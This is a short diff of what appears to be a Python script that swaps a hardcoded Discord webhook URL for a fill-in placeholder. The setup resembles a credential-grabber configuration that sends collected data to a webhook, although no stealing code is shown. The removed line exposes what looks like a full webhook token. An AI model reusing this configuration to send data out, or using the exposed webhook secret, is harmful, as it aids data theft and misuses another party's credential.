@@ -16,7 +16,7 @@ import re
 import subprocess
 
 
-hook = "https://discord.com/api/webhooks/1067770925744914463/gtOijwFEgl2cBsJL_hknVxNR77lwcETvSicCnFweSl8rSzKu7AIS0Q5qeHWWJdvgY8Cw"
+hook = "PUT YOUR WEBHOOK HERE DO NOT DELETE THE COMMAS"
 
 
 DETECTED = False
